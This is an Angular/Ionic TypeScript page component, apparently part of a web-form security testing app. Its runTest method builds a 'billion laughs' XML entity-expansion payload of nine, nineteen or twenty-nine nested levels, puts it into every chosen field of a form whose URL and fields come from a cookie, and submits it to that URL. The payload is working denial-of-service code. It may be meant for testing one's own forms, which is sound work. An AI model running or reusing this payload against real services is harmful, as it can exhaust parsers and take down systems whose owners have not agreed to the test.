import { Component, OnInit } from '@angular/core';
import { MenuController, NavController } from '@ionic/angular';
import { CookieService } from 'ngx-cookie-service';
import { DataManagement } from 'src/app/services/dataManagement';
import { Form } from 'src/app/app.data.model';

@Component({
  selector: 'app-test3',
  templateUrl: './test3.page.html',
  styleUrls: ['./test3.page.scss'],
})
export class Test3Page implements OnInit {

  option: string;
  constructor(public menuCtrl: MenuController,
    private cookieService: CookieService,
    public dM: DataManagement,
    public navCtrl: NavController) {

  }

  ngOnInit() {
  }

  runTest() {

    let tenRep = [1, 2, 3, 4, 5, 6, 7, 8, 9];
    let twentyRep = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19];
    let thertyRep = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29];
    let repeticiones = [];
    if (this.option === 'diez') {
      repeticiones = tenRep;
    }
    if (this.option === 'veinte') {
      repeticiones = twentyRep;
    }
    if (this.option === 'treinta') {
      repeticiones = thertyRep;
    }

    let test: string = '<?XML version="1.0"?> <!DOCTYPE lolz [ <!ELEMENT lolz (#PCDATA)> <!ENTITY lol "lol"> ';

    for (let entry1 of repeticiones) {
      test = test + '<!ENTITY lol' + entry1 + ' "';
      for (let entry2 of repeticiones) {
        if (entry1 === 1) {
          test = test + '&lol;';
        } else {
          let numero: number = entry1 - 1;
          test = test + '&lol' + numero + ';';
        }
      }
      test = test + '">';
    }

    test = test + ']> <lolz>&lol9;</lolz>';


    const fd = new FormData();
    let form: Form;
    form = JSON.parse(this.cookieService.get('form'));
    let url = form.url;
    for (let entry of form.atributos) {
      let nombre: string;
      nombre = entry.name;
      console.log(entry.name);
      if (entry.value === 'none') {
        fd.append(nombre, entry.type);
      } else {
        fd.append(nombre, test);
      }
    }

    this.dM
      .runTest(url, fd)
      .then(data => {

      })
      .catch(error => {
        console.log(error);
      });
  }

}
